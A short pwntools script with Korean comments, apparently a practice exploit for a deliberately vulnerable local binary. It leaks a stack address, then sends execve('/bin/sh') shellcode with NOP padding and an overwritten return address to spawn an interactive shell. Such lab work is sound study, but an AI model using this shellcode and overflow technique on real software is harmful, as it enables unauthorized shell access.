from pwn import *

p = process('./poc')
p.recvuntil(b'buf[50] address : ')
stackAddr = p.recvuntil(b'\n')
stackAddr = int(stackAddr, 16)

# 바이너리 데이터 생성
exploit = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
exploit += b"\x90" * (72 - len(exploit))
exploit += p64(stackAddr)

# 현재 쉘에서 GDB 첨부
gdb.attach(p)

# 데이터 전송
p.send(exploit)

# 대화형 모드로 전환
p.interactive()

